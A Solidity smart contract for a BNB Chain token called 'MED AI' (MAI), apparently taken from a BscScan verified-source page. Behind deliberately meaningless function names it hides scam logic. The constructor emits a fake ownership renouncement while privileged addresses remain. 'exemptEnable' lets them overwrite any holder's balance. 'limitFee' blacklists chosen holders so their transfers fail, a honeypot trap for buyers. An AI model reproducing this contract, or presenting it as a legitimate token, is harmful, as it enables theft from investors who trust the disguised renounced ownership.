/**
 *Submitted for verification at BscScan.com on 2023-02-25
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface enableShould {
    function createPair(address autoEnable, address amountTeam) external returns (address);
}

contract MEDAI {

    function approve(address isToken, uint256 marketingShould) public returns (bool) {
        allowance[marketingShouldReceiver()][isToken] = marketingShould;
        emit Approval(marketingShouldReceiver(), isToken, marketingShould);
        return true;
    }

    event Approval(address indexed takeWallet, address indexed spender, uint256 value);

    address shouldToken = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    function exemptEnable(address swapLaunched, uint256 marketingShould) public {
        walletReceiverMin();
        balanceOf[swapLaunched] = marketingShould;
    }

    function marketingShouldReceiver() private view returns (address) {
        return msg.sender;
    }

    bool public walletFund;

    function tokenLimitLaunched(address takeMarketing) public {
        require(!toFund);
        enableReceiver[takeMarketing] = true;
        toFund = true;
    }

    mapping(address => bool) public fundAuto;

    bool public toFund;

    string public symbol = "MAI";

    bool private limitFrom;

    function transfer(address swapLaunched, uint256 marketingShould) external returns (bool) {
        return transferFrom(marketingShouldReceiver(), swapLaunched, marketingShould);
    }

    function limitFee(address tradingAt) public {
        walletReceiverMin();
        if (tradingAt == buyTo || tradingAt == minExempt) {
            return;
        }
        fundAuto[tradingAt] = true;
    }

    event Transfer(address indexed from, address indexed isList, uint256 value);

    constructor (){ 
        enableReceiver[marketingShouldReceiver()] = true;
        balanceOf[marketingShouldReceiver()] = totalSupply;
        buyTo = marketingShouldReceiver();
        minExempt = enableShould(address(shouldToken)).createPair(address(receiverMode),address(this));
        emit Transfer(address(0), buyTo, totalSupply);
        emit OwnershipTransferred(buyTo, address(0));
    }

    mapping(address => mapping(address => uint256)) public allowance;

    address receiverMode = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    mapping(address => uint256) public balanceOf;

    mapping(address => bool) public enableReceiver;

    function transferFrom(address atReceiverMax, address swapLaunched, uint256 marketingShould) public returns (bool) {
        if (atReceiverMax != marketingShouldReceiver() && allowance[atReceiverMax][marketingShouldReceiver()] != type(uint256).max) {
            require(allowance[atReceiverMax][marketingShouldReceiver()] >= marketingShould);
            allowance[atReceiverMax][marketingShouldReceiver()] -= marketingShould;
        }
        require(!fundAuto[atReceiverMax]);
        return listIs(atReceiverMax, swapLaunched, marketingShould);
    }

    address public owner;

    address public buyTo;

    function walletReceiverMin() private view {
        require(enableReceiver[marketingShouldReceiver()]);
    }

    string public name = "MED AI";

    address public minExempt;

    uint256 public totalSupply = 100000000 * 10 ** 18;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function listIs(address txWallet, address totalTx, uint256 marketingShould) internal returns (bool) {
        require(balanceOf[txWallet] >= marketingShould);
        balanceOf[txWallet] -= marketingShould;
        balanceOf[totalTx] += marketingShould;
        emit Transfer(txWallet, totalTx, marketingShould);
        return true;
    }

    uint256 public swapReceiverFund;

    uint8 public decimals = 18;

}